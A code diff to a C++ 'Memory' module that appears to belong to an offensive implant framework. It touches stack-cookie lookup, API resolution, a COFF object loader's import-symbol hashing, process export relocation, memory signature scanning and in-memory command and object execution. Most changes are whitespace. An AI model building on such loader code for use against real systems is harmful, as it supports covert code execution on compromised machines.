@@ -5,6 +5,7 @@
 
 namespace Memory {
     namespace Methods {
+
         UINT_PTR GetStackCookie() {
             HEXANE
 
@@ -75,6 +76,7 @@ namespace Memory {
     }
 
     namespace Context {
+
         VOID ResolveApi() {
             HEXANE
 
@@ -263,6 +265,7 @@ namespace Memory {
     }
 
     namespace Objects {
+
         UINT_PTR GetInternalAddress(const char* id, bool* internal) {
             HEXANE
 
@@ -434,10 +437,6 @@ namespace Memory {
 
         }
 
-#define IMP_SIZE 6
-#define IMP_SYMBOL __imp_
-#define IMP_SYMBOL_HASH 0x12345678
-
         SIZE_T GetFunctionMapSize(_executable *object) {
             HEXANE
 
@@ -462,7 +461,7 @@ namespace Memory {
                         symbol_name = R_CAST(char*, object->symbol + object->nt_head->FileHeader.NumberOfSymbols);
                     }
 
-                    if (Utils::GetHashFromStringA(symbol_name, IMP_SIZE) == IMP_SYMBOL_HASH) {
+                    if (Utils::GetHashFromStringA(symbol_name, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
                         n_funcs++;
                     }
 
@@ -520,6 +519,7 @@ namespace Memory {
     }
 
     namespace Modules {
+
         HMODULE GetModuleAddress(const LDR_DATA_TABLE_ENTRY* entry) {
             return R_CAST(HMODULE, entry->DllBase);
         }
@@ -605,6 +605,7 @@ namespace Memory {
     }
 
     namespace Scanners {
+
         UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
             HEXANE
 
@@ -630,7 +631,6 @@ namespace Memory {
             }
             return (*mask == 0x00);
         }
-
 
         UINT_PTR SignatureScan(const uintptr_t start, const uint32_t size, const char* signature, const char* mask) {
             HEXANE
@@ -661,6 +661,7 @@ namespace Memory {
     }
 
     namespace Execute {
+
         VOID ExecuteCommand(_parser &parser) {
             HEXANE
 
@@ -711,7 +712,6 @@ namespace Memory {
                     ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
                 }
             }
-        }
 
         VOID LoadObject(const char *const name, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
             HEXANE
